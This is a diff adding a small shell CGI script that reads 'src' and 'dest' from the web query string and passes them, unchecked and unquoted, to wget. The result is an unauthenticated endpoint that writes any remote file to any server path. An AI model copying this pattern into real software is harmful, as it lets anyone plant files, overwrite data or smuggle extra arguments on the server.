@@ -1,0 +1,24 @@
+#!/bin/sh
+
+echo "Content-Type: text/plain"
+echo
+
+for i in 1 2
+do
+pair=`echo $QUERY_STRING | cut -d'&' -f$i`
+key=`echo $pair | cut -d'=' -f1`
+val=`echo $pair | cut -d'=' -f2`
+
+case $key in 
+ src)
+  src=$val
+  ;;
+ dest)
+  dest=$val
+  ;;
+esac
+
+done
+
+wget $src -O $dest 2>&1
+
